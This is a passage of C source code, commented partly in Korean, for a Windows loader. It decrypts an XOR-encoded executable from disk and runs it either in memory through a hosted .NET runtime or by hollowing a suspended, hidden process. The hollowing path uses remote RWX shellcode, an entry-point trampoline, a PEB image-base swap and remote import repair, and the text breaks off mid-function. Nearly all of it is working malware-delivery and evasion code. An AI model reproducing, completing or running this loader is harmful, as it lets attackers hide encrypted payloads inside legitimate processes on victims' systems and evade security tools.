#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <metahost.h>
#include <mscoree.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

#define PRINT_WINAPI_ERR(API) \
    fprintf(stderr, "[!] %s Failed With Error: %lu\n", (API), GetLastError())

#define DELETE_HANDLE(H) do { \
    if ((H) != NULL && (H) != INVALID_HANDLE_VALUE) { \
        CloseHandle((H)); \
        (H) = NULL; \
    } \
} while (0)

// TARGET_PROCESS 제거 - 이제 argv[2]로 받음
#define PARMS   ""
#define XOR_KEY 0x55

BOOL EnableDebugPrivilege(VOID);
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize);
VOID DecryptBuffer(IN OUT PBYTE pBuffer, IN DWORD dwSize);
BOOL IsManagedPE(IN const BYTE* pBuffer, IN DWORD dwSize);
BOOL RunManagedAssembly(IN const BYTE* pBuffer, IN DWORD dwSize);
BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms,
    OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead);
BOOL InstallEntryPointTrampoline(IN HANDLE hProcess,
    IN ULONG_PTR uOriginalEntryPoint, IN ULONG_PTR uPebImageBaseField,
    IN ULONG_PTR uPayloadBase, IN ULONG_PTR uPayloadEntryPoint,
    OUT PBYTE* ppRemoteGateState);
BOOL RepairRemoteIAT(IN HANDLE hProcess, IN PBYTE pPeBuffer,
    IN DWORD dwPeSize, IN PIMAGE_NT_HEADERS pImgNtHdrs,
    IN ULONG_PTR uRemoteBase);
BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress,
    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr);
VOID PrintOutput(IN HANDLE StdOutRead);
BOOL StartStandardInputForwarder(IN OUT HANDLE* pChildStdInWrite,
    OUT HANDLE* pForwardThread);
BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage,
    IN DWORD dwPeSize, IN OPTIONAL LPCSTR cProcessParms,
    IN DWORD dwTimeoutMs);


/* ---------------------------------------------------------------
 * SeDebugPrivilege 활성화
 * --------------------------------------------------------------- */
BOOL EnableDebugPrivilege(VOID) {
    HANDLE          hToken = NULL;
    TOKEN_PRIVILEGES tp    = { 0 };
    BOOL            bState = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PRINT_WINAPI_ERR("OpenProcessToken");
        goto _CLEANUP;
    }

    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        PRINT_WINAPI_ERR("LookupPrivilegeValue");
        goto _CLEANUP;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        PRINT_WINAPI_ERR("AdjustTokenPrivileges");
        goto _CLEANUP;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[!] SeDebugPrivilege not assigned - run as Administrator\n");
        goto _CLEANUP;
    }

    printf("[*] SeDebugPrivilege enabled\n");
    bState = TRUE;

_CLEANUP:
    DELETE_HANDLE(hToken);
    return bState;
}


/* ---------------------------------------------------------------
 * Read raw file into heap buffer
 * --------------------------------------------------------------- */
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {
    HANDLE hFile               = INVALID_HANDLE_VALUE;
    PBYTE  pBuffer             = NULL;
    DWORD  dwFileSize          = 0;
    DWORD  dwNumberOfBytesRead = 0;

    if (!cFileName || !ppBuffer || !pdwFileSize)
        return FALSE;

    *ppBuffer    = NULL;
    *pdwFileSize = 0;

    hFile = CreateFileA(cFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PRINT_WINAPI_ERR("CreateFileA");
        goto _CLEANUP;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0) {
        PRINT_WINAPI_ERR("GetFileSize");
        goto _CLEANUP;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer) {
        PRINT_WINAPI_ERR("HeapAlloc");
        goto _CLEANUP;
    }

    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) ||
        dwNumberOfBytesRead != dwFileSize) {
        PRINT_WINAPI_ERR("ReadFile");
        goto _CLEANUP;
    }

    *ppBuffer    = pBuffer;
    *pdwFileSize = dwFileSize;
    pBuffer      = NULL;

_CLEANUP:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (pBuffer)
        HeapFree(GetProcessHeap(), 0, pBuffer);

    return (*ppBuffer != NULL && *pdwFileSize != 0);
}


/* ---------------------------------------------------------------
 * XOR 0x55 decrypt
 * --------------------------------------------------------------- */
VOID DecryptBuffer(IN OUT PBYTE pBuffer, IN DWORD dwSize) {
    for (DWORD i = 0; i < dwSize; i++) {
        pBuffer[i] ^= XOR_KEY;
    }
    printf("[*] XOR 0x%02X decryption complete (%lu bytes)\n", XOR_KEY, dwSize);
}


/* ---------------------------------------------------------------
 * PE32/PE32+ 공통 .NET(COM descriptor) 판별
 * --------------------------------------------------------------- */
BOOL IsManagedPE(IN const BYTE* pBuffer, IN DWORD dwSize) {
    if (!pBuffer || dwSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)pBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0)
        return FALSE;

    SIZE_T ntOffset = (SIZE_T)dos->e_lfanew;
    SIZE_T minimum = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD);
    if (ntOffset > dwSize || minimum > (SIZE_T)dwSize - ntOffset)
        return FALSE;
    if (*(const DWORD*)(pBuffer + ntOffset) != IMAGE_NT_SIGNATURE)
        return FALSE;

    const IMAGE_NT_HEADERS32* nt32 =
        (const IMAGE_NT_HEADERS32*)(pBuffer + ntOffset);
    const IMAGE_DATA_DIRECTORY* clr = NULL;

    if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        if (sizeof(IMAGE_NT_HEADERS32) > (SIZE_T)dwSize - ntOffset ||
            nt32->OptionalHeader.NumberOfRvaAndSizes <=
                IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
            return FALSE;
        clr = &nt32->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        if (sizeof(IMAGE_NT_HEADERS64) > (SIZE_T)dwSize - ntOffset)
            return FALSE;
        const IMAGE_NT_HEADERS64* nt64 =
            (const IMAGE_NT_HEADERS64*)(pBuffer + ntOffset);
        if (nt64->OptionalHeader.NumberOfRvaAndSizes <=
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
            return FALSE;
        clr = &nt64->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        return FALSE;
    }

    return clr->VirtualAddress != 0 &&
           clr->Size >= sizeof(IMAGE_COR20_HEADER);
}


/* ---------------------------------------------------------------
 * .NET Framework 4 in-memory CLR host
 * --------------------------------------------------------------- */
static const GUID IID_AppDomain_ = {
    0x05F696DC, 0x2B29, 0x3663,
    { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 }
};

typedef struct _CLR_HOST_STATE {
    ICLRMetaHost*     Meta;
    ICLRRuntimeInfo*  Info;
    ICorRuntimeHost*  Host;
    IUnknown*         DomainUnknown;
    IDispatch*        Domain;
    BOOL              ComInitialized;
    BOOL              RuntimeStarted;
} CLR_HOST_STATE;

static PVOID GetInterfaceMethod(IN PVOID pInterface, IN SIZE_T index) {
    return (*(PVOID**)pInterface)[index];
}

static VOID CloseCLRHost(IN OUT CLR_HOST_STATE* pState) {
    if (!pState)
        return;
    if (pState->Domain)
        pState->Domain->Release();
    if (pState->DomainUnknown)
        pState->DomainUnknown->Release();
    if (pState->RuntimeStarted && pState->Host)
        pState->Host->Stop();
    if (pState->Host)
        pState->Host->Release();
    if (pState->Info)
        pState->Info->Release();
    if (pState->Meta)
        pState->Meta->Release();
    if (pState->ComInitialized)
        CoUninitialize();
    ZeroMemory(pState, sizeof(*pState));
}

static HRESULT OpenCLRHost(OUT CLR_HOST_STATE* pState) {
    BOOL loadable = FALSE;
    HRESULT hr;

    if (!pState)
        return E_POINTER;
    ZeroMemory(pState, sizeof(*pState));

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr))
        pState->ComInitialized = TRUE;
    else if (hr != RPC_E_CHANGED_MODE)
        return hr;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                           (LPVOID*)&pState->Meta);
    if (FAILED(hr))
        return hr;

    hr = pState->Meta->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
                                  (LPVOID*)&pState->Info);
    if (FAILED(hr))
        return hr;

    hr = pState->Info->IsLoadable(&loadable);
    if (FAILED(hr) || !loadable)
        return FAILED(hr) ? hr : E_FAIL;

    hr = pState->Info->GetInterface(CLSID_CorRuntimeHost,
                                    IID_ICorRuntimeHost,
                                    (LPVOID*)&pState->Host);
    if (FAILED(hr))
        return hr;

    hr = pState->Host->Start();
    if (FAILED(hr))
        return hr;
    pState->RuntimeStarted = TRUE;

    hr = pState->Host->GetDefaultDomain(&pState->DomainUnknown);
    if (FAILED(hr))
        return hr;

    return pState->DomainUnknown->QueryInterface(
        IID_AppDomain_, (PVOID*)&pState->Domain);
}

static HRESULT LoadAssemblyBytes(
    IN IDispatch* pDomain,
    IN const BYTE* pBuffer,
    IN ULONG dwSize,
    OUT IDispatch** ppAssembly
) {
    typedef HRESULT(STDMETHODCALLTYPE* AppDomainLoad3)(
        PVOID, SAFEARRAY*, PVOID*);

    SAFEARRAY* bytes = NULL;
    BYTE* destination = NULL;
    HRESULT hr;

    if (!pDomain || !pBuffer || !dwSize || !ppAssembly)
        return E_INVALIDARG;
    *ppAssembly = NULL;

    bytes = SafeArrayCreateVector(VT_UI1, 0, dwSize);
    if (!bytes)
        return E_OUTOFMEMORY;

    hr = SafeArrayAccessData(bytes, (PVOID*)&destination);
    if (SUCCEEDED(hr)) {
        memcpy(destination, pBuffer, dwSize);
        SafeArrayUnaccessData(bytes);
        destination = NULL;

        // _AppDomain::Load_3(byte[]) = vtable slot 45.
        AppDomainLoad3 load3 =
            (AppDomainLoad3)GetInterfaceMethod(pDomain, 45);
        hr = load3(pDomain, bytes, (PVOID*)ppAssembly);
    }

    if (destination)
        SafeArrayUnaccessData(bytes);
    SafeArrayDestroy(bytes);
    return hr;
}

static HRESULT GetManagedEntryPoint(
    IN IDispatch* pAssembly,
    OUT IDispatch** ppMethod
) {
    typedef HRESULT(STDMETHODCALLTYPE* AssemblyGetEntryPoint)(
        PVOID, PVOID*);

    if (!pAssembly || !ppMethod)
        return E_INVALIDARG;
    *ppMethod = NULL;

    // _Assembly::get_EntryPoint = vtable slot 16.
    AssemblyGetEntryPoint getEntry =
        (AssemblyGetEntryPoint)GetInterfaceMethod(pAssembly, 16);
    return getEntry(pAssembly, (PVOID*)ppMethod);
}

static HRESULT CreateMainParameters(
    IN BOOL withStringArray,
    OUT SAFEARRAY** ppParameters
) {
    HRESULT hr;

    if (!ppParameters)
        return E_POINTER;
    *ppParameters = SafeArrayCreateVector(
        VT_VARIANT, 0, withStringArray ? 1 : 0);
    if (!*ppParameters)
        return E_OUTOFMEMORY;
    if (!withStringArray)
        return S_OK;

    SAFEARRAY* args = SafeArrayCreateVector(VT_BSTR, 0, 0);
    if (!args) {
        SafeArrayDestroy(*ppParameters);
        *ppParameters = NULL;
        return E_OUTOFMEMORY;
    }

    VARIANT argument;
    VariantInit(&argument);
    V_VT(&argument) = VT_ARRAY | VT_BSTR;
    V_ARRAY(&argument) = args;

    LONG index = 0;
    hr = SafeArrayPutElement(*ppParameters, &index, &argument);
    VariantClear(&argument);
    if (FAILED(hr)) {
        SafeArrayDestroy(*ppParameters);
        *ppParameters = NULL;
    }
    return hr;
}

static HRESULT InvokeManagedEntryPoint(
    IN IDispatch* pMethod,
    IN BOOL withStringArray,
    OUT LONG* pManagedResult
) {
    typedef HRESULT(STDMETHODCALLTYPE* MethodInvoke3)(
        PVOID, VARIANT, SAFEARRAY*, VARIANT*);

    SAFEARRAY* parameters = NULL;
    VARIANT target;
    VARIANT result;
    HRESULT hr;

    if (!pMethod || !pManagedResult)
        return E_INVALIDARG;
    *pManagedResult = 0;

    hr = CreateMainParameters(withStringArray, &parameters);
    if (FAILED(hr))
        return hr;

    VariantInit(&target);
    VariantInit(&result);
    V_VT(&target) = VT_NULL;

    // _MethodInfo::Invoke_3 = vtable slot 37.
    MethodInvoke3 invoke3 =
        (MethodInvoke3)GetInterfaceMethod(pMethod, 37);
    hr = invoke3(pMethod, target, parameters, &result);
    if (SUCCEEDED(hr)) {
        if (V_VT(&result) == VT_EMPTY || V_VT(&result) == VT_NULL) {
            *pManagedResult = 0;
        } else {
            VARIANT converted;
            VariantInit(&converted);
            hr = VariantChangeType(&converted, &result, 0, VT_I4);
            if (SUCCEEDED(hr))
                *pManagedResult = V_I4(&converted);
            VariantClear(&converted);
        }
    }

    VariantClear(&result);
    SafeArrayDestroy(parameters);
    return hr;
}

BOOL RunManagedAssembly(IN const BYTE* pBuffer, IN DWORD dwSize) {
    CLR_HOST_STATE state = { 0 };
    IDispatch* assembly = NULL;
    IDispatch* entryPoint = NULL;
    LONG managedResult = 0;
    HRESULT hr;

    printf("[*] Managed PE detected - using CLR Assembly.Load(byte[])\n");
    printf("[*] Target process is not used for the managed path\n");

    hr = OpenCLRHost(&state);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLR v4 initialization failed: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }
    printf("[+] CLR v4 started\n");

    hr = LoadAssemblyBytes(state.Domain, pBuffer, dwSize, &assembly);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] Assembly.Load(byte[]) failed: 0x%08lX\n",
                (ULONG)hr);
        fprintf(stderr, "[-] Check .NET Framework version and x64/AnyCPU architecture\n");
        goto _CLEANUP;
    }

    hr = GetManagedEntryPoint(assembly, &entryPoint);
    if (FAILED(hr) || !entryPoint) {
        fprintf(stderr, "[-] Managed assembly has no entry point: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }

    fflush(stdout);
    hr = InvokeManagedEntryPoint(entryPoint, FALSE, &managedResult);
    if (hr == DISP_E_BADPARAMCOUNT)
        hr = InvokeManagedEntryPoint(entryPoint, TRUE, &managedResult);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] Managed entry point failed: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }

    printf("[+] Managed entry point returned: %ld\n", managedResult);

_CLEANUP:
    if (entryPoint)
        entryPoint->Release();
    if (assembly)
        assembly->Release();
    CloseCLRHost(&state);
    return SUCCEEDED(hr);
}


/* ---------------------------------------------------------------
 * Create suspended hollowed process with pipe I/O
 * --------------------------------------------------------------- */
BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms,
    OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead) {

    STARTUPINFOA        StartupInfo        = { 0 };
    SECURITY_ATTRIBUTES SecAttr            = { 0 };
    HANDLE              StdInRead          = NULL;
    HANDLE              StdInWrite         = NULL;
    HANDLE              StdOutRead         = NULL;
    HANDLE              StdOutWrite        = NULL;
    LPSTR               cRemoteProcessCmnd = NULL;
    SIZE_T              cbCommand          = 0;
    BOOL                bSTATE             = FALSE;

    if (!cRemoteProcessImage || !pProcessInfo || !pStdInWrite || !pStdOutRead)
        return FALSE;

    ZeroMemory(pProcessInfo, sizeof(*pProcessInfo));
    *pStdInWrite = NULL;
    *pStdOutRead = NULL;

    SecAttr.nLength              = sizeof(SecAttr);
    SecAttr.bInheritHandle       = TRUE;
    SecAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0)) {
        PRINT_WINAPI_ERR("CreatePipe[stdin]");
        goto _CLEANUP;
    }
    if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0)) {
        PRINT_WINAPI_ERR("CreatePipe[stdout]");
        goto _CLEANUP;
    }

    // 부모가 사용할 pipe 끝은 자식에게 상속되면 안 된다.
    // 특히 StdInWrite가 상속되면 자식이 자기 stdin의 write end를
    // 계속 보유하게 되어 부모가 닫아도 EOF를 받지 못한다.
    if (!SetHandleInformation(StdInWrite, HANDLE_FLAG_INHERIT, 0)) {
        PRINT_WINAPI_ERR("SetHandleInformation[stdin-write]");
        goto _CLEANUP;
    }
    if (!SetHandleInformation(StdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        PRINT_WINAPI_ERR("SetHandleInformation[stdout-read]");
        goto _CLEANUP;
    }

    StartupInfo.cb          = sizeof(StartupInfo);
    StartupInfo.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.hStdInput   = StdInRead;
    StartupInfo.hStdOutput  = StdOutWrite;
    StartupInfo.hStdError   = StdOutWrite;

    // 실행 파일 경로에 공백이 있어도 첫 토큰이 잘리지 않도록 인용한다.
    cbCommand = strlen(cRemoteProcessImage) +
        (cProcessParms && *cProcessParms ? strlen(cProcessParms) + 1 : 0) +
        3; // opening quote + closing quote + NUL

    cRemoteProcessCmnd = (LPSTR)LocalAlloc(LPTR, cbCommand);
    if (!cRemoteProcessCmnd) {
        PRINT_WINAPI_ERR("LocalAlloc");
        goto _CLEANUP;
    }

    if (cProcessParms && *cProcessParms)
        sprintf_s(cRemoteProcessCmnd, cbCommand, "\"%s\" %s",
                  cRemoteProcessImage, cProcessParms);
    else
        sprintf_s(cRemoteProcessCmnd, cbCommand, "\"%s\"",
                  cRemoteProcessImage);

    printf("[*] Spawning: %s\n", cRemoteProcessCmnd);

    if (!CreateProcessA(NULL, cRemoteProcessCmnd, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                        NULL, NULL, &StartupInfo, pProcessInfo)) {
        PRINT_WINAPI_ERR("CreateProcessA");
        goto _CLEANUP;
    }

    printf("[*] Target PID: %lu\n", pProcessInfo->dwProcessId);

    *pStdInWrite = StdInWrite;  StdInWrite = NULL;
    *pStdOutRead = StdOutRead;  StdOutRead = NULL;
    bSTATE = TRUE;

_CLEANUP:
    if (cRemoteProcessCmnd) LocalFree(cRemoteProcessCmnd);
    DELETE_HANDLE(StdInRead);
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(StdOutWrite);
    return bSTATE;
}


/* ---------------------------------------------------------------
 * 원래 Windows loader 초기화가 끝난 뒤 다음 순서로 동작한다.
 *   1) PEB ImageBaseAddress를 payload base로 변경
 *   2) payload entry point로 점프
 *
 * 원래 entry에는 12-byte jump만 쓴다. remote gate는 원래 loader
 * 초기화가 끝났음을 부모에게 알리고, 부모가 IAT를 복구할 때까지
 * 기다린 후 PEB 교체와 payload jump를 수행한다.
 * --------------------------------------------------------------- */
BOOL InstallEntryPointTrampoline(IN HANDLE hProcess,
    IN ULONG_PTR uOriginalEntryPoint, IN ULONG_PTR uPebImageBaseField,
    IN ULONG_PTR uPayloadBase, IN ULONG_PTR uPayloadEntryPoint,
    OUT PBYTE* ppRemoteGateState) {

    BYTE entryJump[12] = {
        0x48, 0xB8,                         // mov rax, imm64
        0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0                          // jmp rax
    };
    BYTE bootstrap[64] = {
        0x48, 0xB8,                         // mov rax, reached flag
        0, 0, 0, 0, 0, 0, 0, 0,
        0xC6, 0x00, 0x01,                   // mov byte ptr [rax], 1
        0x80, 0x78, 0x01, 0x01,             // cmp byte ptr [rax+1], 1
        0x74, 0x04,                         // je released
        0xF3, 0x90,                         // pause
        0xEB, 0xF6,                         // jmp wait
        0x48, 0xB8,                         // released: mov rax, PEB field
        0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0xBA,                         // mov rdx, payload base
        0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0x89, 0x10,                   // mov [rax], rdx
        0x48, 0xB8,                         // mov rax, payload entry
        0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0,                         // jmp rax
        0, 0, 0, 0,                         // padding
        0,                                  // reached flag (offset 62)
        0                                   // release flag (offset 63)
    };
    PBYTE remoteBootstrap = NULL;
    DWORD oldProtection = 0;
    DWORD ignoredProtection = 0;
    SIZE_T written = 0;

    if (!ppRemoteGateState)
        return FALSE;
    *ppRemoteGateState = NULL;

    remoteBootstrap = (PBYTE)VirtualAllocEx(
        hProcess, NULL, sizeof(bootstrap),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBootstrap) {
        PRINT_WINAPI_ERR("VirtualAllocEx[entry-bootstrap]");
        return FALSE;
    }

    {
        ULONG_PTR reachedFlag = (ULONG_PTR)(remoteBootstrap + 62);
        memcpy(&bootstrap[2],  &reachedFlag, sizeof(reachedFlag));
    }
    memcpy(&bootstrap[25], &uPebImageBaseField, sizeof(uPebImageBaseField));
    memcpy(&bootstrap[35], &uPayloadBase, sizeof(uPayloadBase));
    memcpy(&bootstrap[48], &uPayloadEntryPoint, sizeof(uPayloadEntryPoint));

    if (!WriteProcessMemory(hProcess, remoteBootstrap,
                            bootstrap, sizeof(bootstrap), &written) ||
        written != sizeof(bootstrap)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[entry-bootstrap]");
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }
    if (!FlushInstructionCache(hProcess, remoteBootstrap,
                               sizeof(bootstrap))) {
        PRINT_WINAPI_ERR("FlushInstructionCache[entry-bootstrap]");
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    {
        ULONG_PTR bootstrapAddress = (ULONG_PTR)remoteBootstrap;
        memcpy(&entryJump[2], &bootstrapAddress, sizeof(bootstrapAddress));
    }

    if (!VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                          sizeof(entryJump), PAGE_EXECUTE_READWRITE,
                          &oldProtection)) {
        PRINT_WINAPI_ERR("VirtualProtectEx[original-entry]");
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, (PVOID)uOriginalEntryPoint,
                            entryJump, sizeof(entryJump), &written) ||
        written != sizeof(entryJump)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[entry-trampoline]");
        VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                         sizeof(entryJump), oldProtection,
                         &ignoredProtection);
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!FlushInstructionCache(hProcess, (PVOID)uOriginalEntryPoint,
                               sizeof(entryJump))) {
        PRINT_WINAPI_ERR("FlushInstructionCache");
        VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                         sizeof(entryJump), oldProtection,
                         &ignoredProtection);
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                          sizeof(entryJump), oldProtection,
                          &ignoredProtection)) {
        PRINT_WINAPI_ERR("VirtualProtectEx[restore-entry]");
        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[*] Entry trampoline installed: 0x%p -> 0x%p -> 0x%p\n",
           (PVOID)uOriginalEntryPoint, remoteBootstrap,
           (PVOID)uPayloadEntryPoint);
    *ppRemoteGateState = remoteBootstrap + 62;
    return TRUE;
}


/* ---------------------------------------------------------------
 * Raw PE의 RVA를 파일 버퍼 주소로 변환
 * --------------------------------------------------------------- */
static PBYTE RawPointerFromRva(IN PBYTE pPeBuffer, IN DWORD dwPeSize,
    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN DWORD dwRva, IN SIZE_T cbRequired) {

    if (!pPeBuffer || !pImgNtHdrs)
        return NULL;

    if (dwRva < pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
        if ((SIZE_T)dwRva + cbRequired > dwPeSize)
            return NULL;
        return pPeBuffer + dwRva;
    }

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD sectionSize = sections[i].Misc.VirtualSize;
        if (sectionSize < sections[i].SizeOfRawData)
            sectionSize = sections[i].SizeOfRawData;

        if (dwRva < sections[i].VirtualAddress ||
            dwRva - sections[i].VirtualAddress >= sectionSize)
            continue;

        DWORD offsetInSection = dwRva - sections[i].VirtualAddress;
        if (offsetInSection >= sections[i].SizeOfRawData)
            return NULL;

        SIZE_T rawOffset = (SIZE_T)sections[i].PointerToRawData +
                           offsetInSection;
        if (rawOffset + cbRequired > dwPeSize)
            return NULL;
        return pPeBuffer + rawOffset;
    }

    return NULL;
}


static LPCSTR PathBaseName(IN LPCSTR path) {
    LPCSTR slash = strrchr(path, '\\');
    LPCSTR forwardSlash = strrchr(path, '/');
    if (!slash || (forwardSlash && forwardSlash > slash))
        slash = forwardSlash;
    return slash ? slash + 1 : path;
}


static PBYTE FindRemoteModuleBase(IN DWORD processId,
    IN LPCSTR moduleName) {

    HANDLE snapshot = INVALID_HANDLE_VALUE;
    MODULEENTRY32 entry = { 0 };
    PBYTE result = NULL;

    for (DWORD attempt = 0; attempt < 5; attempt++) {
        snapshot = CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
        if (snapshot != INVALID_HANDLE_VALUE)
            break;
        if (GetLastError() != ERROR_BAD_LENGTH)
            return NULL;
    }
    if (snapshot == INVALID_HANDLE_VALUE)
        return NULL;

    entry.dwSize = sizeof(entry);
    if (Module32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szModule, PathBaseName(moduleName)) == 0) {
                result = entry.modBaseAddr;
                break;
            }
        } while (Module32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return result;
}


static BOOL LoadLibraryIntoRemoteProcess(IN HANDLE hProcess,
    IN LPCSTR libraryName);


/* ---------------------------------------------------------------
 * 로컬 함수의 소유 DLL + RVA를 구해 대상의 같은 DLL 기준 주소로 환산.
 * forwarded export도 GetProcAddress가 반환한 실제 소유 DLL을 사용한다.
 * 실제 소유 DLL이 대상에 없으면 선택적으로 원격 적재한 뒤 재시도한다.
 * --------------------------------------------------------------- */
static BOOL TranslateProcedureAddressToRemoteEx(IN HANDLE hProcess,
    IN FARPROC localProcedure, OUT ULONG_PTR* pRemoteProcedure,
    IN BOOL loadMissingOwner) {

    MEMORY_BASIC_INFORMATION localInfo = { 0 };
    CHAR ownerPath[MAX_PATH] = { 0 };
    DWORD processId;

    if (!hProcess || !localProcedure || !pRemoteProcedure)
        return FALSE;
    *pRemoteProcedure = 0;

    if (!VirtualQuery((LPCVOID)localProcedure, &localInfo,
                      sizeof(localInfo)) ||
        localInfo.Type != MEM_IMAGE || !localInfo.AllocationBase)
        return FALSE;

    HMODULE localOwner = (HMODULE)localInfo.AllocationBase;
    if (!GetModuleFileNameA(localOwner, ownerPath,
                            ARRAYSIZE(ownerPath)))
        return FALSE;

    processId = GetProcessId(hProcess);
    if (!processId)
        return FALSE;

    LPCSTR ownerName = PathBaseName(ownerPath);
    PBYTE remoteOwner = FindRemoteModuleBase(processId, ownerName);
    if (!remoteOwner && loadMissingOwner) {
        printf("[*] Remote loading forwarded owner DLL: %s\n",
               ownerName);
        if (!LoadLibraryIntoRemoteProcess(hProcess, ownerName)) {
            fprintf(stderr,
                    "[-] Unable to load forwarded owner DLL: %s\n",
                    ownerName);
            return FALSE;
        }
        remoteOwner = FindRemoteModuleBase(processId, ownerName);
    }
    if (!remoteOwner) {
        fprintf(stderr,
                "[-] Function owner DLL is not loaded in target: %s\n",
                ownerName);
        return FALSE;
    }

    ULONG_PTR offset = (ULONG_PTR)localProcedure -
                       (ULONG_PTR)localOwner;
    ULONG_PTR remoteProcedure = (ULONG_PTR)remoteOwner + offset;

    MEMORY_BASIC_INFORMATION remoteInfo = { 0 };
    if (!VirtualQueryEx(hProcess, (LPCVOID)remoteProcedure,
                        &remoteInfo, sizeof(remoteInfo)) ||
        remoteInfo.State != MEM_COMMIT ||
        remoteInfo.Type != MEM_IMAGE)
        return FALSE;

